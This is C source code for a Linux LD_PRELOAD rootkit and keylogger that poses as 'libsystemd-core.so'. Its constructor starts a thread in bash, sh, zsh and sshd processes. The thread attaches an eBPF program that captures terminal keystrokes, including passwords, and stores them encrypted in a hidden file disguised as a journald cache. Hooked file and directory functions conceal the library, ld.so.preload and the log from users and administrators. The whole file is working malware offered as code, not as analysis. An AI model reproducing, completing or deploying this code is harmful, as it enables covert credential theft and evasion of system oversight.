#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <dlfcn.h>
#include <errno.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/resource.h> 
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <bpf/libbpf.h>
#include "config.h"
#include "ghost.skel.h"

// --- MACROS ---
#define HOOK __attribute__((visibility("default")))
#define DEBUG_FILE "/tmp/cham_debug.log"

// --- CONFIGURATION ---
// TODO: COLLEZ VOTRE CLE PUBLIQUE ICI
#define RSA_PUB_KEY "-----BEGIN PUBLIC KEY-----\n" \
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzkhKdTMboODnFS7IC0AB\n" \
"+TMeRQ8fD2e4dWaDsRYyUzroABLdrqob0pL9oMve+cTZoBWbIh/mgx4wUY2YArii\n" \
"Bj0G1cm+OxAkjZpE9yjrm3AxrVjIGXN5Vit5W+bRNdgID/yFkWtyrzxEal0yg/+D\n" \
"MQACeXROfuFFp+TJrX6Ahir6lJrRYJKabiTEUW0I76+YzIIgROoFdaUoz5EhVY/C\n" \
"agHUbKPUpAlGLhIGIxJhPmt55snNEmWePO++EMzNiWm8t3EDwHvkcGOLLoTC2TUa\n" \
"xp+FL2GkZHw6qi9iUHTEURvdeBhH+rPCDQ2sLHGqx6z8dBuukP/Z3EJc+xtqIzEe\n" \
"twIDAQAB\n" \
"-----END PUBLIC KEY-----\n"

#define STORAGE_PATH "/var/log/.journald-audit-cache.dat"
#define MALWARE_FILENAME "libsystemd-core.so"
const char *TARGETS[] = {"sshd", "bash", "sh", "zsh", "login", "su", NULL};

// --- TYPES MANQUANTS (CORRIGÉ) ---
typedef uint32_t u32;
typedef uint8_t u8;

struct linux_dirent64 {
    uint64_t d_ino;
    int64_t d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

// --- GLOBALS ---
static FILE *log_fp = NULL;
static FILE *debug_fp = NULL;
static unsigned char session_key[32];
static unsigned char session_nonce[12];
static uint32_t chunk_counter = 0;
static int crypto_ready = 0;

// --- DEBUG LOGGER ---
void log_debug(const char *fmt, ...) {
    if (!debug_fp) debug_fp = fopen(DEBUG_FILE, "a");
    if (debug_fp) {
        va_list args;
        va_start(args, fmt);
        vfprintf(debug_fp, fmt, args);
        va_end(args);
        fflush(debug_fp);
    }
}

static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args) {
    if (debug_fp) vfprintf(debug_fp, format, args);
    return 0;
}

// --- UTILITAIRE ---
int is_hidden(const char *name) {
    if (!name) return 0;
    if (strstr(name, MALWARE_FILENAME)) return 1;
    if (strstr(name, "ld.so.preload")) return 1;
    if (strstr(STORAGE_PATH, name) && strlen(name) > 2) return 1;
    return 0;
}

// --- CRYPTO ---
void init_crypto() {
    if (crypto_ready) return;
    
    log_debug("[INFO] init_crypto: Opening storage %s\n", STORAGE_PATH);

    int fd = syscall(SYS_openat, AT_FDCWD, STORAGE_PATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) {
        log_debug("[ERROR] init_crypto: syscall openat failed: %s\n", strerror(errno));
        return;
    }
    
    log_fp = fdopen(fd, "ab");
    if (!log_fp) return;

    RAND_bytes(session_key, sizeof(session_key));
    RAND_bytes(session_nonce, sizeof(session_nonce));

    fseek(log_fp, 0, SEEK_END);
    if (ftell(log_fp) == 0) {
        BIO *keybio = BIO_new_mem_buf((void*)RSA_PUB_KEY, -1);
        RSA *rsa = PEM_read_bio_RSA_PUBKEY(keybio, NULL, NULL, NULL);
        if (rsa) {
            unsigned char enc_key[512];
            int enc_len = RSA_public_encrypt(sizeof(session_key), session_key, enc_key, rsa, RSA_PKCS1_OAEP_PADDING);
            fwrite("CHAMv9", 1, 6, log_fp); 
            fwrite(&enc_len, 4, 1, log_fp);
            fwrite(enc_key, 1, enc_len, log_fp);
            fwrite(session_nonce, 1, 12, log_fp);
            RSA_free(rsa);
        }
        BIO_free(keybio);
    }
    crypto_ready = 1;
}

void write_chunk(const unsigned char *data, int len) {
    if (!log_fp) return;
    
    unsigned char iv[16];
    memcpy(iv, session_nonce, 12);
    uint32_t ctr = htonl(chunk_counter++);
    memcpy(iv + 12, &ctr, 4);

    unsigned char cipher[256];
    int outlen, tmplen;
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, session_key, iv);
    EVP_EncryptUpdate(ctx, cipher, &outlen, data, len);
    EVP_EncryptFinal_ex(ctx, cipher + outlen, &tmplen);
    EVP_CIPHER_CTX_free(ctx);

    fwrite(&ctr, 4, 1, log_fp);
    fwrite(&len, 4, 1, log_fp);
    fwrite(cipher, 1, outlen + tmplen, log_fp);
    fflush(log_fp);
}

// --- WORKER ---
void *worker(void *ctx) {
    usleep(100000); 
    
    debug_fp = fopen(DEBUG_FILE, "a");
    log_debug("--- WORKER STARTED [PID: %d] ---\n", getpid());

    // Fix pour l'erreur "permission denied" au chargement BPF
    struct rlimit rlim = {RLIM_INFINITY, RLIM_INFINITY};
    if (setrlimit(RLIMIT_MEMLOCK, &rlim)) {
        log_debug("[WARN] setrlimit failed: %s\n", strerror(errno));
    }

    init_crypto();
    libbpf_set_print(libbpf_print_fn);

    log_debug("[INFO] Loading BPF Skeleton...\n");
    struct ghost_bpf *skel = ghost_bpf__open();
    if (!skel) {
        log_debug("[ERROR] ghost_bpf__open failed\n");
        return NULL;
    }

    if (ghost_bpf__load(skel) != 0) {
        log_debug("[ERROR] ghost_bpf__load failed\n");
        return NULL;
    }

    if (ghost_bpf__attach(skel) != 0) {
        log_debug("[ERROR] ghost_bpf__attach failed\n");
        return NULL;
    }
    log_debug("[SUCCESS] BPF Loaded & Attached!\n");

    struct ring_buffer *rb;
    char line[128]; int pos = 0;

    int handle_event(void *ctx, void *data, size_t sz) {
        struct { u32 pid; u32 len; u8 data[16]; } *e = data;
        
        for(int i=0; i<e->len; i++) {
            char c = e->data[i];
            if (c >= 32 && c < 127) line[pos++] = c;
            else if (c == '\r' || c == '\n') {
                line[pos++] = '\n';
                write_chunk((unsigned char*)line, pos);
                pos = 0;
            }
            if (pos >= 60) {
                write_chunk((unsigned char*)line, pos);
                pos = 0;
            }
        }
        return 0;
    }

    rb = ring_buffer__new(bpf_map__fd(skel->maps.tty_rb), handle_event, NULL, NULL);
    if (!rb) {
        log_debug("[ERROR] RingBuffer create failed\n");
        return NULL;
    }

    while(1) {
        ring_buffer__poll(rb, 100);
    }
}

// --- HOOKS ---

HOOK struct dirent *readdir(DIR *dirp) {
    struct dirent *(*orig)(DIR *) = dlsym(RTLD_NEXT, "readdir");
    if (!orig) return NULL;
    struct dirent *entry;
    while (1) {
        entry = orig(dirp);
        if (!entry) break;
        if (!is_hidden(entry->d_name)) break;
    }
    return entry;
}

HOOK ssize_t getdents64(int fd, void *dirp, size_t count) {
    ssize_t (*orig)(int, void*, size_t) = dlsym(RTLD_NEXT, "getdents64");
    if (!orig) return 0;
    ssize_t ret = orig(fd, dirp, count);
    if (ret <= 0) return ret;
    long pos = 0;
    while (pos < ret) {
        struct linux_dirent64 *d = (struct linux_dirent64 *)((char *)dirp + pos);
        if (is_hidden(d->d_name)) {
            long reclen = d->d_reclen;
            memmove(d, (char *)dirp + pos + reclen, ret - pos - reclen);
            ret -= reclen;
            continue;
        }
        pos += d->d_reclen;
    }
    return ret;
}

HOOK int openat(int dirfd, const char *pathname, int flags, ...) {
    mode_t mode = 0;
    if ((flags & O_CREAT) || (flags & O_TMPFILE) == O_TMPFILE) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }
    if (pathname && is_hidden(pathname)) { errno = ENOENT; return -1; }
    int (*orig)(int, const char*, int, mode_t) = dlsym(RTLD_NEXT, "openat");
    return orig(dirfd, pathname, flags, mode);
}

HOOK int open(const char *pathname, int flags, ...) {
    mode_t mode = 0;
    if ((flags & O_CREAT) || (flags & O_TMPFILE) == O_TMPFILE) { va_list args; va_start(args, flags); mode = va_arg(args, mode_t); va_end(args); }
    if (pathname && is_hidden(pathname)) { errno = ENOENT; return -1; }
    int (*orig)(const char*, int, mode_t) = dlsym(RTLD_NEXT, "open");
    return orig(pathname, flags, mode);
}

HOOK int open64(const char *pathname, int flags, ...) {
    mode_t mode = 0;
    if ((flags & O_CREAT) || (flags & O_TMPFILE) == O_TMPFILE) { va_list args; va_start(args, flags); mode = va_arg(args, mode_t); va_end(args); }
    if (pathname && is_hidden(pathname)) { errno = ENOENT; return -1; }
    int (*orig)(const char*, int, mode_t) = dlsym(RTLD_NEXT, "open64");
    return orig(pathname, flags, mode);
}

HOOK FILE *fopen(const char *pathname, const char *mode) {
    if (pathname && is_hidden(pathname)) { errno = ENOENT; return NULL; }
    FILE *(*orig)(const char*, const char*) = dlsym(RTLD_NEXT, "fopen");
    return orig(pathname, mode);
}

HOOK FILE *fopen64(const char *pathname, const char *mode) {
    if (pathname && is_hidden(pathname)) { errno = ENOENT; return NULL; }
    FILE *(*orig)(const char*, const char*) = dlsym(RTLD_NEXT, "fopen64");
    return orig(pathname, mode);
}

HOOK int statx(int dirfd, const char *pathname, int flags, unsigned int mask, struct statx *statxbuf) {
    if (pathname && is_hidden(pathname)) { errno = ENOENT; return -1; }
    int (*orig)(int, const char*, int, unsigned int, struct statx*) = dlsym(RTLD_NEXT, "statx");
    return orig(dirfd, pathname, flags, mask, statxbuf);
}

HOOK int newfstatat(int dirfd, const char *pathname, struct stat *statbuf, int flags) {
    if (pathname && is_hidden(pathname)) { errno = ENOENT; return -1; }
    int (*orig)(int, const char*, struct stat*, int) = dlsym(RTLD_NEXT, "newfstatat");
    return orig(dirfd, pathname, statbuf, flags);
}

// --- INIT ---
__attribute__((constructor)) void init() {
    if (getenv("CHAM_ACTIF")) return;
    extern char *program_invocation_short_name;
    if (!program_invocation_short_name) return;

    int is_shell = 0;
    if (strstr(program_invocation_short_name, "bash")) is_shell=1;
    else if (strstr(program_invocation_short_name, "sh")) is_shell=1;
    else if (strstr(program_invocation_short_name, "zsh")) is_shell=1;
    else if (strstr(program_invocation_short_name, "sshd")) is_shell=1;

    if (is_shell) {
        setenv("CHAM_ACTIF", "1", 1);
        pthread_t tid;
        pthread_create(&tid, NULL, worker, NULL);
    }
}
